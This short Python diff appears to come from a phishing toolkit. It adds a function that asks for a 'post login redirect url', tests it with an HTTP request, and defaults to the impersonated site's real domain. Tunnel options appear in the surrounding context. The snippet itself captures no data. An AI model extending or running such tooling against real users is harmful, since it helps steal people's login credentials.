@@ -219,3 +219,18 @@ def push_page_options(port) -> str:
 
     print(info(f"Invalid selection, running default tunnel: {PVT_TUNNELS[0]}"))
     return PVT_TUNNELS[0], host
+
+
+def redirect_setter(page_name: str) -> str:
+    redirect_url = input(theme_color("Post login redirect url (Leave blank for default redirect): "))
+    try:
+        print(requests.get(redirect_url).status_code)
+    except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
+        print(info("Invalid url. Default redirect will be set"))
+        time.sleep(2)
+        redirect_url = f'https://www.{page_name}.com/'
+        return redirect_url
+    else:
+        print(info(f"Url {redirect_url} has been set!"))
+        time.sleep(2)
+        return redirect_url
